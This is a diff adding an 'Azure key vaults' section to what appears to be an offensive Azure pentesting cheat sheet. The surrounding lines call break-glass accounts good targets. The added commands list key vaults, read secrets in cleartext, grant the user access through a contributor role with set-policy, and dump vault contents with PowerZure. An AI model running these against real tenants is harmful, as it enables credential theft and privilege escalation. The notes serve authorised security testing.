@@ -73,3 +73,29 @@ $apps.Id
 - Microsoft recommends not setting up MFA for them
 - Two accounts are usually recommended to be set up
 - If you can determine which ones are the break glass they can be good targets
+
+## Azure key vaults
+#### List key vaults which current user has view access too
+```
+az keyvault list --query '[].name' --output tsv
+```
+
+#### Try to access keyvault
+```
+az keyvault secret list --vault-name <KEYVAULT> --query '[].id' --output tsv
+```
+
+#### Read cleartext secret
+```
+az keyvault secret show --id <URI from last command> | ConvertFrom-Json
+```
+
+#### Give access if contributer role
+```
+az keyvault set-policy --name <KEYVAULT NAME> --upn <CONTRIBUTER USERNAME> --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
+```
+
+#### Powerzure get keyvault contents
+```
+Get-AzureKeyVaultContent
+```
